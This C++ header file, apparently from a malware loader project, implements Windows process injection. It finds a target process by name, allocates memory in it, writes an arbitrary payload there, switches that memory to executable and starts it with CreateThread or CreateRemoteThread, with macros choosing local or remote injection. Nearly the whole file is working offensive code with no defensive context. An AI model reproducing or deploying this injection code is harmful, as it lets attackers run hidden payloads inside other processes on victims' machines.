#pragma once
//Contains various functions that handle process injection tasks
//Macros and dependences are imported in main.cpp and/or config.h (imported by main before this file)

// returns the pid for the process 
// returns -1 if not found
// returns -2 for invalid_handle_value
int findPidByName(const char* name)
{
    HANDLE h = NULL;
    PROCESSENTRY32 procSnapshot = { 0 };
    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE)
        return -2;

    procSnapshot.dwSize = sizeof(PROCESSENTRY32);
    int pid = -1;

    do
    {
        if (lstrcmpiA(procSnapshot.szExeFile, name) == 0)
        {
            pid = (int)procSnapshot.th32ProcessID;
            break;
        }
    } while (Process32Next(h, &procSnapshot));

    CloseHandle(h);
    return pid;
}

// Performs process injection to the local process
int Inject_CreateThread(HANDLE hProc, PVOID payload, SIZE_T payload_len)
{
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    int iRet = -1;
    DWORD dummy = 0;
    SIZE_T bytesWritten = 0;
    BOOL writeStatus;

    pRemoteCode = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory in hProd using VirtualAllocEx. should be readable and writable.
    if (pRemoteCode == NULL)
    {
        COUT("Inject_CreateThread pRemoteCode failed: " << GetLastError());
        goto Cleanup;
    }

    // write to process memory.
    writeStatus = WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, &bytesWritten);
    if (!writeStatus)
    {
        COUT("Inject_CreateThread WriteProcessMemory failed: " << GetLastError());
        goto Cleanup;
    }
    if (bytesWritten < payload_len)
    {
        COUT("Inject_CreateThread WriteProcessMemory failed: wrote " << bytesWritten << " but expected to write " << payload_len);
        goto Cleanup;
    }

    // fix VirtualProtect arguments. No longer need write but does need execute
    if (!VirtualProtect(pRemoteCode, payload_len, PAGE_EXECUTE_READ, &dummy))
    {
        COUT("Inject_CreateThread VirtualProtectEx failed: " << GetLastError());
        goto Cleanup;
    }

    // add call for CreateThread.
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        iRet = TRUE;
    }

Cleanup:

    if (pRemoteCode)
    {
        SecureZeroMemory(&pRemoteCode, sizeof(pRemoteCode));
        VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
    }
    if (hThread)
    {
        SecureZeroMemory(&hThread, sizeof(hThread));
        CloseHandle(hThread);
    }

    return iRet;
}


//Performs process injection into a given remote process
int Inject_CreateRemoteThread(HANDLE hProc, PVOID payload, SIZE_T payload_len)
{
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    int iRet = -1;
    DWORD dummy = 0;
    SIZE_T bytesWritten = 0;
    BOOL writeStatus;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory in hProd using VirtualAllocEx. should be readable and writable.
    if (pRemoteCode == NULL)
    {
        COUT("Inject_CreateRemoteThread VirtualAllocEx failed: " << GetLastError());
        goto Cleanup;
    }

    // write to process memory.
    writeStatus = WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, &bytesWritten);
    if (!writeStatus)
    {
        COUT("Inject_CreateRemoteThread WriteProcessMemory failed: " << GetLastError());
        goto Cleanup;
    }
    if (bytesWritten < payload_len)
    {
        COUT("Inject_CreateRemoteThread WriteProcessMemory failed: wrote " << bytesWritten << " but expected to write " << payload_len);
        goto Cleanup;
    }

    // fix VirtualProtectEx arguments. No longer need write but does need execute
    if (!VirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READ, &dummy))
    {
        COUT("Inject_CreateRemoteThread VirtualProtectEx failed: " << GetLastError());
        goto Cleanup;
    }

    // add call for CreateRemoteThread.
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        iRet = TRUE;
    }

Cleanup:

    if (pRemoteCode)
    {
        SecureZeroMemory(&pRemoteCode, sizeof(pRemoteCode));
        VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
    }
    if (hThread)
    {
        SecureZeroMemory(&hThread, sizeof(hThread));
        CloseHandle(hThread);
    }

    return iRet;
}

// Handles overall process injection procedure. Usable for both remote and local process injection.
int inject_process(BOOL Remote_Inject, char *Remote_Process_Name, unsigned char payload[], unsigned int payload_len)
{
    int pid = 0;
    HANDLE hProc = NULL;
    if (Remote_Inject)
    {
        pid = findPidByName(Remote_Process_Name);
    }
    else {
        pid = (int)GetCurrentProcessId();
    }

    if (pid > 0)
    {

#ifndef _DEBUG
#ifdef VERBOSE
        PRINTF("Found PID = %d\n", pid);
#endif
#endif
        // open handle to target process
        hProc = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid
        );

        if (hProc != NULL)
        {
#ifdef REMOTE_INJECT
            Inject_CreateRemoteThread(hProc, global_payload, global_payload_len);
#else
            Inject_CreateThread(hProc, payload, payload_len);
#endif
            if (hProc != NULL)
            {
                CloseHandle(hProc);
            }
        }
    }

    return TRUE;
}
